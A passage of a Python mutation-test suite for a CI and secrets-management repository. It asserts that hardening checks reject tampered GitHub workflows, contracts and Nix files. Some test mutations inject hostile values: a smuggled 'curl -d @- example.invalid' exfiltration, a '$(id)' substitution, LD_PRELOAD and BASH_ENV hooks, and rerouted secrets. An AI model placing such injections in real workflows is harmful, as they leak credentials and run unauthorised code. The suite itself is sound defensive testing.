        ('OPS_SHA="$(jq -r .merge_commit_sha "$RUNNER_TEMP/pi-pr.json")"',
         'OPS_SHA="${{ inputs.ops_sha }}"'),
        ('.base_commit.sha == $sha and (.status == "identical" or .status == "ahead")', 'true'),
        ('.head_branch == "proposals"', '.head_branch == "poc/pi-worker-oauth-20261017"'),
        ('os.environ["CLOUDFLARE_ACCOUNT_ID"]+":pi"', 'os.environ["CLOUDFLARE_ACCOUNT_ID"]+":other"'),
        ('"SCREEN_ONLY_NO_TOKEN_EXCHANGE_OR_STORAGE"', '"FULL_RUNTIME"'),
        ('has("durable_objects")', 'has("unused_binding")'),
    ):
        expect_red(replace_text(pi_preview, old, new))

    def add_database_path(root: Path) -> None:
        name = "duck" + "db"
        (root / f"contracts/{name}.jsonl").write_text("{}\n")

    expect_red(add_database_path)

    def add_token(root: Path) -> None:
        token = "gh" + "p_" + ("A" * 30)
        (root / "contracts/token.txt").write_text(token)

    expect_red(add_token)

    def add_historical_fallback(root: Path) -> None:
        historical = "roccho-dev/" + "envs-old"
        with (root / "adapters/jev_api.py").open("a", encoding="utf-8") as stream:
            stream.write("\n# fallback " + historical + "\n")

    expect_red(add_historical_fallback)

    def propose_main_deletion(root: Path) -> None:
        with (root / "README.md").open("a", encoding="utf-8") as stream:
            stream.write("\nDelete `main` after migration.\n")

    expect_red(propose_main_deletion)
    expect_red(replace_text("README.md", "retained compatibility branch: `main`", "retained compatibility mirror: `main`"))

    obsolete_field = "age_" + "recipients"
    obsolete_source = "SOURCE_" + "JEV_API_KEY"
    author = ".github/workflows/author-dev-jev-api.yml"
    project = ".github/workflows/project-dev-jev-api.yml"
    expect_red(mutate_plane("dev.authoring", lambda row: row.update({obsolete_field: []})))
    expect_red(mutate_plane("dev.runtime", lambda row: row.update({"required_variables": []})))
    expect_red(mutate_plane("stg.projection", lambda row: row["required_variables"].clear()))
    expect_red(mutate_plane("prd.projection", lambda row: row["required_secrets"].pop()))
    expect_red(mutate_plane("dev.projection", lambda row: row["required_variables"].append(
        {"name": "EXTRA", "type": "cloudflare_account_id", "lifecycle": "persistent"})))
    expect_red(mutate_plane("dev.authoring", lambda row: row["required_secrets"][0].update(
        {"lifecycle": "persistent"})))
    expect_red(replace_text(author, "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n", ""))
    expect_red(replace_text(author, "${{ vars.SOPS_AGE_RECIPIENTS }}", "${{ secrets.SOPS_AGE_RECIPIENTS }}"))
    expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}",
                            f"{obsolete_source}: ${{{{ secrets.{obsolete_source} }}}}"))
    expect_red(replace_text(author, "JEV_API_KEY: ${{ secrets.JEV_API_KEY }}", "JEV_API_KEY: fixture-literal"))
    expect_red(replace_text(author, "SOPS_AGE_RECIPIENTS: ${{ vars", "AGE_RECIPIENTS: ${{ vars"))
    expect_red(replace_text(project, "          CLOUDFLARE_ACCOUNT_ID:",
                            "          EXTRA: ${{ secrets.EXTRA }}\n          CLOUDFLARE_ACCOUNT_ID:"))

    # The effect entry must stay repo-owned: no ambient tool, runtime acquisition, or unlocked closure.
    entry = '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE"'
    build = "nix build .#effect-toolchain --no-update-lock-file"
    identity_step = "      - name: Record effect toolchain identity\n"
    expect_red(replace_text(author, f"{entry} author", "python3 adapters/jev_api.py author"))
    expect_red(replace_text(project, f"{entry} project", "nix shell .#effect-toolchain -c envs-effect project"))
    expect_red(replace_text(project, f"{entry} project", f"npx --yes wrangler@4 && {entry} project"))
    expect_red(replace_text(author, '"$tool/gh" pr create', "gh pr create"))
    expect_red(replace_text(author, '"$tool/git" push', "git push"))
    # Effect workflows consume the provided artifact; any rebuild or Nix install there is RED.
    expect_red(replace_text(project, identity_step, f"      - name: Rebuild\n        run: {build}\n\n{identity_step}"))
    expect_red(replace_text(author, identity_step, "      - name: Install Nix\n        uses: cachix/install-nix-action@"
                            "13d8dd58da0234aa297dedd986986ccb8e7f3e24\n\n" + identity_step))
    expect_red(lambda root: (root / "flake.lock").unlink())
    expect_red(replace_text("flake.lock", '"rev": "', '"rev": "0'))
    expect_red(replace_text("flake.nix", "wrangler = \"${pkgs.wrangler}", "wrangler = \"/usr/bin/wrangler"))
    expect_red(replace_text("adapters/jev_api.py", 'wrangler = tools["wrangler"]', 'wrangler = "npx"'))
    expect_red(replace_text(".github/workflows/check.yml", build, "nix flake show"))

    # Absolute-path, chained, or rebound executables are as ambient as bare names.
    expect_red(replace_text(author, f"{entry} author", "/usr/bin/python3 adapters/jev_api.py author"))
    expect_red(replace_text(author, '"$tool/git" push', "/usr/bin/git push"))
    expect_red(replace_text(project, '"$tool/gh" pr create', '"/usr/bin/gh" pr create'))
    expect_red(replace_text(project, 'tool="$ENVS_EFFECT_BIN"', 'tool="/usr/bin"'))
    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A; /usr/bin/curl -d @- example.invalid'))
    expect_red(replace_text(author, '"$tool/git" add -A', '"$tool/git" add -A $(/usr/bin/id)'))
    expect_red(replace_text(project, "        run: |", "        shell: /usr/bin/bash {0}\n        run: |"))

    # The closure identity is recorded by the tool itself after realization and before secrets.
    identity = "      - name: Record effect toolchain identity\n" f"        run: '{entry} toolchain'\n\n"
    expect_red(replace_text(author, identity, ""))
    expect_red(replace_text(project, identity, ""))

    def move_identity_after_secrets(root: Path) -> None:
        path = root / project
        text = path.read_text(encoding="utf-8")
        path.write_text(text.replace(identity, "") + "\n" + identity, encoding="utf-8")

    expect_red(move_identity_after_secrets)

    # The committed lock must be proven Nix-generated, and the closure tools executed.
    check = ".github/workflows/check.yml"
    expect_red(replace_text(check, '          cmp flake.lock "$relock/flake.lock"\n', ""))
    expect_red(replace_text(check, '          "$tool/wrangler" --version\n', ""))
    expect_red(replace_text(check, 'pages secret "$command" --help', 'pages secret "$command"'))

    # The consumer is the clean-start consumer verbatim, resolved by the dispatched SHA, before secrets.
    consumer = "- name: Obtain provided effect artifact\n"
    verify = '          echo "${digest#sha256:}  $art/envs-effect.zip" | sha256sum -c -\n'
    expect_red(replace_text(author, verify, ""))
    expect_red(replace_text(project, "ENVS_SOURCE_SHA: ${{ github.sha }}", "ENVS_SOURCE_SHA: ${{ github.event.inputs.sha }}"))
    expect_red(replace_text(project, consumer, "- name: Obtain effect artifact\n"))

    def move_consumer_after_secrets(root: Path) -> None:
        path = root / author
        text = path.read_text(encoding="utf-8")
        step = next(block for block in text.split("\n\n") if consumer in block)
        path.write_text(text.replace(step + "\n\n", "") + "\n" + step + "\n", encoding="utf-8")

    expect_red(move_consumer_after_secrets)

    # check provides the artifact and proves a checkout-free, Nix-free clean start with destructive cases.
    expect_red(replace_text(check, "actions/upload-artifact@", "actions/upload-artifact-disabled@"))
    expect_red(replace_text(check, "nix build .#effect-artifact", "nix build .#effect-toolchain"))
    expect_red(replace_text(check, "    needs: toolchain\n", ""))
    expect_red(replace_text(check, "    timeout-minutes: 20\n    steps:\n", "    timeout-minutes: 20\n    steps:\n"
                            "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n\n"))
    expect_red(replace_text(check, verify, ""))
    expect_red(replace_text(check, 'test "$MISSING" = failure', "true"))
    expect_red(replace_text(check, "for case in lock adapter; do", "for case in lock; do"))
    expect_red(replace_text("flake.nix", "closureInfo { rootPaths = [ effect-toolchain ]; }", "closureInfo { rootPaths = [ ]; }"))
    expect_red(replace_text("flake.nix", "-I ${self}/adapters/jev_api.py", "-I adapters/jev_api.py"))

    # The artifact is built from, named after, and resolved by the exact commit, repository, and push producer.
    source_ref = "          ref: ${{ github.event.pull_request.head.sha || github.sha }}\n"
    expect_red(replace_text(check, source_ref, ""))
    expect_red(replace_text(check, '          test "$(git rev-parse HEAD)" = "$ENVS_SOURCE_SHA"\n', ""))
    expect_red(replace_text(check, "name: envs-effect-${{ env.ENVS_SOURCE_SHA }}",
                            "name: envs-effect-${{ github.sha }}"))
    expect_red(replace_text(check, "cancel-in-progress: ${{ github.event_name == 'pull_request' }}", "cancel-in-progress: true"))
    expect_red(replace_text("flake.nix", "        echo ${rev} > SOURCE\n", ""))

    def weaken_consumer(old: str, new: str):
        def mutate(root: Path) -> None:
            for relative in (check, author, project):
                replace_text(relative, old, new)(root)

        return mutate

    expect_red(weaken_consumer('          test "$(tar -xOf "$art/content/envs-effect.tar" SOURCE)" = "$ENVS_SOURCE_SHA"\n', ""))
    expect_red(weaken_consumer('(.event == "push" and .conclusion == "success")', '.conclusion == "success"'))
    expect_red(weaken_consumer(" and .head_repository.full_name == $repo", ""))
    expect_red(replace_text(check, "            '.head_repository.full_name = \"fork/envs\"' \\\n", ""))
    expect_red(replace_text(check, "artifact built from another commit was accepted", "accepted"))

    # effect-shape runs the provided artifact over a same-commit data checkout, exactly as effect jobs do.
    expect_red(replace_text(check, '"$ENVS_EFFECT_BIN/envs-effect" --root "$GITHUB_WORKSPACE" toolchain | tee',
                            '"$ENVS_EFFECT_BIN/envs-effect" toolchain | tee'))
    expect_red(replace_text(check, ".source == $sha and .root == $root", ".status == \"PASS\""))

    # Effect jobs accept only declared step env; nothing but the consumer may alter the step environment.
    expect_red(replace_text(author, "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n",
                            "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n          BASH_ENV: /tmp/hook\n"))
    expect_red(replace_text(project, "    environment: dev-projection\n",
                            "    environment: dev-projection\n    env:\n      LD_PRELOAD: /tmp/hook.so\n"))
    expect_red(replace_text(project, '          tool="$ENVS_EFFECT_BIN"\n',
                            '          tool="$ENVS_EFFECT_BIN"\n          "$tool/git" config core.hooksPath >>"$GITHUB_PATH"\n'))
    expect_red(replace_text("README.md", "dev-projection/SOPS_AGE_KEY", "dev-projection/REMOVED"))
    expect_red(replace_text("README.md", "prd-projection/CLOUDFLARE_ACCOUNT_ID", "prd-projection/REMOVED"))

    # The rent workflow is a manual effect workflow under the same rules: it runs only the persistent root entry with
    # exactly the dev.rent-root inputs and hands off both envelopes.
    linode = ".github/workflows/probe-dev-linode-read.yml"
    expect_red(replace_text(linode, "environment: dev-projection", "environment: dev-authoring"))
    expect_red(replace_text(linode, "${{ secrets.LINODE_API_TOKEN }}", "${{ secrets.CLOUDFLARE_API_TOKEN }}"))
    expect_red(replace_text(linode, f"{entry} linode-read-probe", f"{entry} rent-tunnel"))
    expect_red(mutate_plane("dev.linode-read-probe", lambda row: row["required_secrets"][0].update(
        {"lifecycle": "one_shot_ingress"})))

    rent = ".github/workflows/project-dev-rent-tunnel.yml"
    expect_red(replace_text(rent, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n"))
    # Rent stage ingress is dev-projection: no host-specific Environment, and never the Pages/Mail Cloudflare slots.
    expect_red(replace_text(rent, "environment: dev-projection", "environment: dev-rent-tunnel"))
    expect_red(replace_text(rent, "environment: dev-projection", "environment: dev-authoring"))
    expect_red(replace_text(rent, "environment: dev-projection", "environment: ${{ 'dev-projection' }}"))
    rent_token = "          RENT_CLOUDFLARE_API_TOKEN: ${{ secrets.RENT_CLOUDFLARE_API_TOKEN }}\n"
    expect_red(replace_text(rent, rent_token, "          RENT_CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n"))
    expect_red(replace_text(rent, rent_token, "          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n"))
    expect_red(replace_text(rent, "          RENT_CLOUDFLARE_ACCOUNT_ID: ${{ vars.RENT_CLOUDFLARE_ACCOUNT_ID }}\n",
                            "          RENT_CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}\n"))
    expect_red(replace_text(rent, rent_token, rent_token + "          R2_PARENT_API_TOKEN: ${{ secrets.R2_PARENT_API_TOKEN }}\n"))
    expect_red(replace_text(rent, "${{ vars.RENT_AGE_RECIPIENT }}", "${{ secrets.RENT_AGE_RECIPIENT }}"))
    expect_red(replace_text(rent, "          RENT_STATE_KEY: ${{ vars.RENT_STATE_KEY }}\n", ""))
    expect_red(replace_text(rent, "          RENT_STATE_KEY: ${{ vars.RENT_STATE_KEY }}\n",
                            "          RENT_STATE_KEY: ${{ vars.RENT_STATE_KEY }}\n          RENT_TUNNEL_ID: ${{ vars.RENT_TUNNEL_ID }}\n"))
    expect_red(replace_text(rent, f"{entry} rent-root", "python3 adapters/jev_api.py rent-root"))
    expect_red(replace_text(rent, f"{entry} rent-root", f"{entry} rent-tunnel"))
    expect_red(replace_text(rent, "contracts/environments.jsonl\n", "contracts/environments.jsonl README.md\n"))
    expect_red(replace_text(rent, " ciphertexts/dev-rent-client.sops.yaml contracts/", " contracts/"))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["required_variables"].pop()))
    expect_red(mutate_plane("dev.rent-root", lambda row: row.update({"github_environment": "dev-rent-client"})))
    for plane, retired in (("dev.rent-root", "dev-rent-tunnel"), ("dev.rent-tunnel", "dev-rent-tunnel")):
        expect_red(mutate_plane(plane, lambda row, retired=retired: row.update(
            {"github_environment": retired, "active_github_environment": retired})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["required_secrets"][0].update({"name": "CLOUDFLARE_API_TOKEN"})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["required_variables"][0].update({"name": "CLOUDFLARE_ACCOUNT_ID"})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["required_secrets"].append(
        {"name": "R2_PARENT_API_TOKEN", "type": "opaque", "lifecycle": "finite_expiry"})))
    # The client plane is an output only: no Environment and no ingress of its own.
    expect_red(mutate_plane("dev.rent-client", lambda row: row.update(
        {"github_environment": "dev-rent-client", "active_github_environment": "dev-rent-client"})))
    expect_red(mutate_plane("dev.rent-client", lambda row: row.update({"required_secrets": [], "required_variables": [
        {"name": "RENT_CLIENT_AGE_RECIPIENT", "type": "age_recipient", "lifecycle": "persistent"}]})))
    # The root activated without its envelopes, from a valid fresh preimage: on a tree that already holds the
    # accepted handoff the same row change alone would be a no-op.
    expect_red(lambda root: (fresh_rent(root), mutate_plane("dev.rent-root", lambda row: row.update(
        {"migration_state": "ACTIVE", "active_github_environment": "dev-projection"}))(root)))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"provider_apply_authority",', ""))
    expect_red(replace_text("README.md", "dev-projection/RENT_STATE_PASSPHRASE", "dev-projection/REMOVED"))
    expect_red(replace_text("README.md", "dev-projection/RENT_CLOUDFLARE_API_TOKEN", "dev-rent-tunnel/RENT_CLOUDFLARE_API_TOKEN"))
    expect_red(replace_text("README.md", "applied only by `rent-root` under a separate effect grant", "declaration only"))
    expect_red(replace_text(check, ' --tofu "$tool/tofu"', ""))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row["required_variables"].pop()))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row["required_variables"][2].update({"type": "age_recipient_list"})))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row.update({"source_kind": "public_sops"})))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"does_not_own":["target_apply",', '"does_not_own":['))
    expect_red(replace_text("README.md", "dev-projection/RENT_AGE_RECIPIENT", "dev-projection/REMOVED"))

    # TEMPORARY one-time encrypted relocation: the only dev-rent-tunnel selector, strictly gated and sealed to the fixed key.
    relocation = ".github/workflows/relocate-dev-rent-secrets.yml"
    relocation_entry = "adapters/relocate_rent_secrets.py"
    expect_red(replace_text(relocation, "github.ref == 'refs/heads/proposals'", "github.ref_name == 'proposals'"))
    for clause in (" && github.repository_id == '1391871347'", " && github.event_name == 'workflow_dispatch'",
                   " && github.sha == inputs.expected_source_sha", " && github.run_attempt == '1'",
                   " && github.actor_id == '40359643'", " && github.triggering_actor == 'roccho-dev'"):
        expect_red(replace_text(relocation, clause, ""))
    expect_red(replace_text(relocation, "        required: true\n",
                            "        required: true\n      public_key:\n        type: string\n        required: true\n"))
    expect_red(replace_text(relocation, "  workflow_dispatch:\n", "  push:\n  workflow_dispatch:\n"))
    expect_red(replace_text(relocation, "  contents: read\n", "  contents: write\n"))
    expect_red(replace_text(relocation, "  cancel-in-progress: false\n", "  cancel-in-progress: true\n"))
    expect_red(replace_text(relocation, "    environment: dev-rent-tunnel\n", "    environment: dev-projection\n"))
    expect_red(replace_text(relocation, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    env:\n      PYTHONPATH: /tmp\n"))
    rent_passphrase = "          RENT_STATE_PASSPHRASE: ${{ secrets.RENT_STATE_PASSPHRASE }}\n"
    expect_red(replace_text(relocation, rent_passphrase, rent_passphrase + "          MAIL_CONFIG: ${{ secrets.MAIL_CONFIG }}\n"))
    expect_red(replace_text(relocation, rent_passphrase, ""))
    expect_red(replace_text(relocation, "      - name: Build locked Python with PyNaCl\n        run: |\n",
                            "      - name: Build locked Python with PyNaCl\n        env:\n"
                            "          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n        run: |\n"))
    expect_red(replace_text(relocation, " -I adapters/relocate_rent_secrets.py selftest'", " -c pass'"))
    expect_red(replace_text(relocation, "          set -euo pipefail\n          test \"$(git rev-parse HEAD)\"",
                            "          set -euxo pipefail\n          set -x\n          test \"$(git rev-parse HEAD)\""))
    expect_red(replace_text(relocation, "f9948418dc8628ac02b6d6337e191ade9429d59d", "0" * 40))
    expect_red(replace_text(relocation, "(ps: [ ps.pynacl ])", "(ps: [ ps.pynacl ps.requests ])"))
    expect_red(replace_text(relocation, " -I adapters/relocate_rent_secrets.py selftest'\n",
                            " -I adapters/relocate_rent_secrets.py selftest'\n        env:\n          X: ${{ vars.X }}\n"))
    expect_red(replace_text(relocation, "          retention-days: 3\n", "          retention-days: 90\n"))
    expect_red(replace_text(relocation, "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
                            "actions/upload-artifact@v4"))
    expect_red(replace_text(relocation, 'echo "RELOCATE_PYTHON=$python" >>"$GITHUB_ENV"',
                            'echo "RELOCATE_PYTHON=$python" >>"$GITHUB_ENV"\n          echo "LD_PRELOAD=/tmp/x.so" >>"$GITHUB_ENV"'))
    expect_red(replace_text(relocation_entry, 'DEST_PUBLIC_KEY = "0p90Ahe11eOEuKSz+G63Mbzuk81Xx7hKM7b7cwG5ZgQ="',
                            'DEST_PUBLIC_KEY = "' + "A" * 43 + '="'))
    expect_red(replace_text(relocation_entry, '("CLOUDFLARE_API_TOKEN", "RENT_CLOUDFLARE_API_TOKEN")',
                            '("CLOUDFLARE_API_TOKEN", "CLOUDFLARE_API_TOKEN")'))
    expect_red(replace_text(relocation_entry, 'FORBIDDEN_INPUTS = ("MAIL_CONFIG", ', 'FORBIDDEN_INPUTS = ('))
    expect_red(replace_text(relocation_entry, "values.append((source, destination, bytes(value)))",
                            "values.append((source, destination, bytes(value).strip()))"))
    expect_red(replace_text(relocation_entry, "SECRET_LIMIT = 48 * 1024", "SECRET_LIMIT = 1024 * 1024"))
    expect_red(replace_text(check, '"$python" -I checks/test_relocate_rent_secrets.py --require-nacl',
                            '"$python" -I checks/test_relocate_rent_secrets.py'))
    expect_red(replace_text(check, "run: python3 checks/test_relocate_rent_secrets.py\n", "run: 'true'\n"))
    expect_red(lambda root: (root / "checks/test_relocate_rent_secrets.py").unlink())
    # The relocation exception is this one file only: another workflow still may not select the old Environment.
    expect_red(replace_text(".github/workflows/operate-dev-mail-routing.yml", "    environment: dev-projection\n",
                            "    environment: dev-rent-tunnel\n"))

    # The OCI dev target: one declared binding, one literal author step with only its own inputs, no default target.
    oci_mapping = "          OCI_DEV_AGE_RECIPIENT: ${{ vars.OCI_DEV_AGE_RECIPIENT }}\n"
    cloudflare_mapping = "          SOPS_AGE_RECIPIENTS: ${{ vars.SOPS_AGE_RECIPIENTS }}\n"
    expect_red(replace_text(author, oci_mapping, ""))
    expect_red(replace_text(author, oci_mapping, cloudflare_mapping))
    expect_red(replace_text(author, cloudflare_mapping, cloudflare_mapping + oci_mapping))
    expect_red(replace_text(author, "          - jev-api.oci-dev\n", ""))
    expect_red(replace_text(author, "        required: true\n        type: choice\n", "        type: choice\n"))
    expect_red(replace_text(author, "author --target jev-api.oci-dev'", "author --target ${{ inputs.target }}'"))
    expect_red(replace_text(author, "author --target jev-api'", "author'"))
    expect_red(replace_text(author, "        if: inputs.target == 'jev-api.oci-dev'\n", ""))
    expect_red(replace_text("contracts/bindings.jsonl", '"required_variables":[{"name":"OCI_DEV_AGE_RECIPIENT","type":"age_recipient"',
                            '"required_variables":[{"name":"OCI_DEV_AGE_RECIPIENT","type":"age_recipient_list"'))
    expect_red(replace_text("contracts/bindings.jsonl", '"host":"oci-dev","kind":"process_env"', '"host":"oci-dev","kind":"env_file"'))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"binding":"jev-api.oci-dev",', ""))
    expect_red(replace_text("README.md", "dev-authoring/OCI_DEV_AGE_RECIPIENT", "dev-authoring/REMOVED"))
    expect_red(replace_text(check, "checks/test_jev_api.py --sops", "checks/test_jev_api.py --no-sops"))

    # Go authoring reuses the Environment but may select only OPENCODE_API_KEY and the exact target recipient.
    go_mapping = "          OPENCODE_API_KEY: ${{ secrets.OPENCODE_API_KEY }}\n"
    go_target = "          - opencode-go.oci-dev\n"
    expect_red(replace_text(author, go_target, ""))
    expect_red(replace_text(author, "        if: inputs.target == 'opencode-go.oci-dev'\n", ""))
    expect_red(replace_text(author, "author --target opencode-go.oci-dev'", "author --target jev-api.oci-dev'"))
    expect_red(replace_text(author, go_mapping, "          JEV_API_KEY: ${{ secrets.JEV_API_KEY }}\n"))
    expect_red(replace_text(author, go_mapping, ""))
    expect_red(replace_text(author, "          - opencode-go.oci-dev\n", "          - jev-api.oci-dev\n"))
    expect_red(replace_text(author, "github.repository == 'roccho-org/envs'",
                            "github.repository == 'roccho-dev/envs'"))
    expect_red(mutate_plane("dev.opencode-go-authoring", lambda row: row["required_secrets"][0].update(
        {"name": "JEV_API_KEY"})))
    expect_red(mutate_plane("dev.opencode-go-authoring", lambda row: row["required_variables"][0].update(
        {"type": "age_recipient_list"})))
    expect_red(mutate_plane("dev.opencode-go-authoring", lambda row: row.update(
        {"github_environment": "different-authoring"})))
    expect_red(mutate_plane("dev.opencode-go-authoring", lambda row: row.update(
        {"migration_state": "ACTIVE"})))
    expect_red(replace_text("contracts/bindings.jsonl", '"host":"oci-dev","kind":"pi_auth_command"',
                            '"host":"oci-dev","kind":"process_env"'))
    expect_red(replace_text("contracts/provider-consumer.jsonl", '"binding":"opencode-go.oci-dev"',
                            '"binding":"jev-api.oci-dev"'))
    expect_red(replace_text("README.md", "dev-authoring/OPENCODE_API_KEY", "dev-authoring/REMOVED-GO"))
    expect_red(replace_text("README.md", "`author --target opencode-go.oci-dev`", "`author --target anything`"))

    # TypeLLM is selected explicitly and may never receive another provider's secret.
    type_mapping = "          TYPELLM_API_KEY: ${{ secrets.TYPELLM_API_KEY }}\n"
    expect_red(replace_text(author, "          - typellm-api.oci-dev\n", ""))
    expect_red(replace_text(author, "        if: inputs.target == 'typellm-api.oci-dev'\n", ""))
    expect_red(replace_text(author, "author --target typellm-api.oci-dev'", "author --target jev-api.oci-dev'"))
    expect_red(replace_text(author, type_mapping, go_mapping))
    expect_red(replace_text(author, type_mapping, type_mapping + go_mapping))
    expect_red(mutate_plane("dev.typellm-authoring", lambda row: row["required_secrets"][0].update(
        {"name": "JEV_API_KEY"})))
    expect_red(mutate_plane("dev.typellm-authoring", lambda row: row.update({"migration_state": "ACTIVE"})))
    expect_red(replace_text("README.md", "dev-authoring/TYPELLM_API_KEY", "dev-authoring/REMOVED-TYPELLM"))

    def invalid_type_ciphertext(root: Path) -> None:
        (root / "ciphertexts/dev-typellm-api.oci-dev.sops.yaml").write_text("TYPELLM_API_KEY: plain\n")

    expect_red(invalid_type_ciphertext)

    # The own TypeLLM target keeps its own recipient and never falls back to dev.
    expect_red(replace_text(author, "          - typellm-api.versapro-own-oci\n", ""))
    expect_red(replace_text(author, "        if: inputs.target == 'typellm-api.versapro-own-oci'\n", ""))
    expect_red(replace_text(author, "author --target typellm-api.versapro-own-oci'", "author --target typellm-api.oci-dev'"))
    own_type_step = "      - name: Author TypeLLM VersaPro own OCI ciphertext\n        if: inputs.target == 'typellm-api.versapro-own-oci'\n        env:\n          TYPELLM_API_KEY: ${{ secrets.TYPELLM_API_KEY }}\n          VERSAPRO_OWN_OCI_AGE_RECIPIENT: ${{ vars.VERSAPRO_OWN_OCI_AGE_RECIPIENT }}\n        run: '\"$ENVS_EFFECT_BIN/envs-effect\" --root \"$GITHUB_WORKSPACE\" author --target typellm-api.versapro-own-oci'\n\n"
    expect_red(replace_text(author, own_type_step, own_type_step.replace(
        "VERSAPRO_OWN_OCI_AGE_RECIPIENT", "OCI_DEV_AGE_RECIPIENT")))
    expect_red(replace_text(author, own_type_step, own_type_step.replace(type_mapping, go_mapping)))
    expect_red(replace_text("README.md", "`author --target typellm-api.versapro-own-oci`",
                            "`author --target undeclared-typellm`"))

    def invalid_own_type_ciphertext(root: Path) -> None:
        (root / "ciphertexts/dev-typellm-api.versapro-own-oci.sops.yaml").write_text("TYPELLM_API_KEY: plain\n")

    expect_red(invalid_own_type_ciphertext)

    def invalid_go_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-opencode-go.oci-dev.sops.yaml").write_text("OPENCODE_API_KEY: plain\n")

    expect_red(invalid_go_ciphertext)

    def invalid_oci_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-jev-api.oci-dev.sops.yaml").write_text("JEV_API_KEY: plain\n")

    expect_red(invalid_oci_ciphertext)

    def extra_ciphertext(root: Path) -> None:
        (root / "ciphertexts").mkdir(exist_ok=True)
        (root / "ciphertexts/dev-other.sops.yaml").write_text("x: 1\n")

    expect_red(extra_ciphertext)

    # check runs the real locked SOPS roundtrip; age is check-only and proven outside the provided artifact.
    expect_red(replace_text(check, ' --age-keygen "$RUNNER_TEMP/check-age/bin/age-keygen"', ""))
    expect_red(replace_text(check, "run: python3 checks/test_rent_tunnel.py\n", "run: 'true'\n"))
    expect_red(replace_text(check, 'if grep -qxF "$age" "$RUNNER_TEMP/provided.list"; then', "if false; then"))
    expect_red(replace_text(check, '          grep -qxF "$sops" "$RUNNER_TEMP/provided.list"\n', ""))
    expect_red(replace_text("flake.nix", "[ python3 sops wrangler git gh openssh curl ]",
                            "[ python3 sops wrangler git gh openssh curl age ]"))
    expect_red(replace_text("flake.nix", "        check-age = pkgs.age;\n", ""))
    expect_red(replace_text("flake.nix", "${pkgs.cacert}/etc/ssl/certs/ca-bundle.crt", "/etc/ssl/certs/ca-certificates.crt"))

    # The retired disposable Access probe and R2 state proof: no workflow, provider root, test, plane or boundary returns.
    def restore(relative: str, text: str):
        def mutate(root: Path) -> None:
            (root / relative).parent.mkdir(parents=True, exist_ok=True)
            (root / relative).write_text(text, encoding="utf-8")
        return mutate

    for relative in repository.RETIRED_PATHS:
        expect_red(restore(relative, "# retired\n"))
    expect_red(restore("providers/dev-rent-access-probe/terraform.tfstate", "{}\n"))

    def restore_row(relative: str, row: dict):
        def mutate(root: Path) -> None:
            path = root / relative
            path.write_text(path.read_text(encoding="utf-8") + json.dumps(row, separators=(",", ":")) + "\n",
                            encoding="utf-8")
        return mutate

    expect_red(restore_row("contracts/environments.jsonl", {
        "id": "dev.rent-access-probe", "kind": "envs.secretPlane.v1", "stage_id": "dev", "plane_id": "rent-access-probe",
        "owner": "envs", "github_environment": "dev-rent-access-probe", "active_github_environment": None,
        "migration_state": "NOT_CONFIGURED", "source_kind": "provider_issued", "target_kind": "disposable_probe",
        "desired_state": "ENABLED", "required_secrets": [], "required_variables": []}))
    expect_red(restore_row("contracts/provider-consumer.jsonl", {
        "id": "dev.rent-state-proof.provider", "kind": "envs.providerConsumerBoundary.v1", "role": "provider",
        "repository": "roccho-dev/envs", "stage": "dev", "capability": "rent-state-proof"}))
    expect_red(replace_text(".github/workflows/check.yml", "run: python3 checks/test_rent_tunnel.py\n",
                            "run: python3 checks/test_rent_tunnel.py\n\n      - name: Retired\n"
                            "        run: python3 checks/test_rent_state_proof.py\n"))
    # The persistent root: native validate accepts each of these, so the oracle must refuse them.
    rent = "providers/dev-rent-cloudflare/main.tf"
    expect_red(replace_text(rent, '  backend "http" {}\n', '  backend "local" {}\n'))
    expect_red(replace_text(rent, '  backend "http" {}\n', '  backend "http" {\n    address = "http://127.0.0.1:1/"\n  }\n'))
    expect_red(replace_text(rent, '  backend "http" {}\n', '  backend "http" {}\n  backend "s3" {}\n'))
    # S2: the GitHub-ref state location is exact and unique, and every backend-capable rent-root entry is closed.
    expect_red(mutate_plane("dev.rent-root", lambda row: row["state_backend"].update({"ref": "refs/heads/proposals"})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["state_backend"].update({"repository_id": 1})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["state_backend"].update(
        {"lock_ref": "refs/heads/locks/state/other.json"})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row["state_backend"].update({"repository": "roccho-dev/envs"})))
    expect_red(mutate_plane("dev.rent-root", lambda row: row.pop("state_backend")))
    expect_red(mutate_plane("dev.rent-tunnel", lambda row: row.update({"state_backend": {"state_path": "x"}})))
    adapter = "adapters/jev_api.py"
    for gate in ("ROOT_APPLY_SOURCE_ACTIVE", "ROOT_MIGRATE_SOURCE_ACTIVE", "ROOT_PLAN_SOURCE_ACTIVE"):
